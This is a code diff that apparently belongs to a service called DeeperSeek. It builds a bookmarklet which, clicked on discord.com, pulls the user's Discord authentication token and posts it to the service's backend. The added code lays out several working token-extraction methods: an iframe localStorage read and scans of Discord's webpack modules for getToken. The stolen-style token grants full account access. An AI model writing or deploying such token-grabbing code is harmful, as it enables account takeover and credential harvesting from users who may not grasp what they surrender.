@@ -36,47 +36,79 @@ function beginBookmarklet(userId, backendOrigin) {
   const expiresAt = Date.now() + OTT_TTL_MS;
   _otts.set(ott, { userId, expiresAt });
 
-  // The bookmarklet runs on discord.com (cross-origin). It:
-  //   1. Extracts the user token from Discord's webpack bundle
-  //   2. POSTs { ott, discord_token } to DeeperSeek
-  //   3. Shows an alert on success/error
+  // The bookmarklet runs on discord.com (cross-origin). It tries multiple
+  // proven token-extraction methods and falls through to the next on failure:
+  //   1. iframe localStorage trick — uses a fresh iframe to read localStorage
+  //      because Discord deletes window.localStorage.token after page load.
+  //   2. webpack chunk push (default export) — for older Discord builds.
+  //   3. webpack chunk push (Z export) — common in newer minified builds.
+  //   4. Deep webpack scan — looks at every property of every module.
   //
-  // We use a self-invoking function wrapped as javascript: URI.
-  // The OTT and API URL are baked in at generation time.
-  const apiUrl  = `${backendOrigin}/api/discord/bookmarklet/submit`;
-  const script  = `javascript:(function(){` +
-    `var ott=${JSON.stringify(ott)};` +
-    `var api=${JSON.stringify(apiUrl)};` +
-    `function gt(){` +
+  // After extracting, POSTs { ott, discord_token } to DeeperSeek.
+  const apiUrl = `${backendOrigin}/api/discord/bookmarklet/submit`;
+  const script =
+    `javascript:(function(){` +
+      `var ott=${JSON.stringify(ott)};` +
+      `var api=${JSON.stringify(apiUrl)};` +
+      `if(!location.host.endsWith('discord.com')){` +
+        `alert('DeeperSeek: open discord.com first, then click this bookmarklet.');return;` +
+      `}` +
+      `var token=null;` +
+      // Method 1 — iframe trick (most reliable as of 2025)
       `try{` +
-        `var t;` +
-        // Webpack 5 chunk push trick — works on Discord web and Canary
-        `webpackChunkdiscord_app.push([[Math.random()],{},` +
-          `function(e){` +
-            `Object.values(e.c).forEach(function(m){` +
-              `if(m&&m.exports){` +
-                `var x=m.exports.default||m.exports;` +
-                `if(x&&typeof x.getToken==='function'){t=x.getToken();}` +
-                `if(!t&&x.Z&&typeof x.Z.getToken==='function'){t=x.Z.getToken();}` +
+        `var f=document.createElement('iframe');` +
+        `document.body.appendChild(f);` +
+        `var lt=f.contentWindow.localStorage.token;` +
+        `document.body.removeChild(f);` +
+        `if(lt){token=lt.replace(/^"|"$/g,'');}` +
+      `}catch(e){}` +
+      // Method 2-4 — webpack chunk push, multiple known shapes
+      `if(!token){` +
+        `try{` +
+          `var found=null;` +
+          `(window.webpackChunkdiscord_app=window.webpackChunkdiscord_app||[]).push([` +
+            `[Math.random()],{},` +
+            `function(req){` +
+              `for(var c in req.c){` +
+                `var m=req.c[c]&&req.c[c].exports;if(!m)continue;` +
+                `var cands=[m,m.default,m.Z,m.ZP];` +
+                `for(var i=0;i<cands.length;i++){` +
+                  `var x=cands[i];` +
+                  `if(x&&typeof x.getToken==='function'){` +
+                    `try{var v=x.getToken();if(v){found=v;return;}}catch(_){}` +
+                  `}` +
+                `}` +
+                // Deep scan — sometimes getToken is on a nested key
+                `if(typeof m==='object'){` +
+                  `for(var k in m){` +
+                    `try{` +
+                      `var y=m[k];` +
+                      `if(y&&typeof y.getToken==='function'){` +
+                        `var v2=y.getToken();if(v2){found=v2;return;}` +
+                      `}` +
+                    `}catch(_){}` +
+                  `}` +
+                `}` +
               `}` +
-            `});` +
-          `}` +
-        `]);` +
-        `return t;` +
-      `}catch(e){return null;}` +
-    `}` +
-    `var token=gt();` +
-    `if(!token){alert('DeeperSeek: could not read Discord token.\\nMake sure you are on discord.com');return;}` +
-    `fetch(api,{` +
-      `method:'POST',` +
-      `headers:{'Content-Type':'application/json'},` +
-      `body:JSON.stringify({ott:ott,discord_token:token})` +
-    `}).then(function(r){return r.json();})` +
-    `.then(function(d){` +
-      `if(d.ok){alert('✓ DeeperSeek: Discord connected as @'+d.username+'!');}` +
-      `else{alert('DeeperSeek error: '+(d.error||'unknown'));}` +
-    `}).catch(function(e){alert('DeeperSeek: request failed — '+e.message);});` +
-  `})();`;
+            `}` +
+          `]);` +
+          `if(found)token=found;` +
+        `}catch(e){}` +
+      `}` +
+      `if(!token){` +
+        `alert('DeeperSeek: could not read Discord token.\\n\\nMake sure you are on discord.com (not Canary/PTB) and logged in.\\nIf this keeps failing, log out and back in to Discord, then retry.');` +
+        `return;` +
+      `}` +
+      `fetch(api,{` +
+        `method:'POST',` +
+        `headers:{'Content-Type':'application/json'},` +
+        `body:JSON.stringify({ott:ott,discord_token:token})` +
+      `}).then(function(r){return r.json();})` +
+      `.then(function(d){` +
+        `if(d.ok){alert('✓ DeeperSeek: Discord connected as '+(d.global_name||'@'+d.username)+'!\\nYou can close this and return to DeeperSeek.');}` +
+        `else{alert('DeeperSeek error: '+(d.error||'unknown'));}` +
+      `}).catch(function(e){alert('DeeperSeek: request failed — '+e.message);});` +
+    `})();`;
 
   return { ott, script, expiresAt };
 }
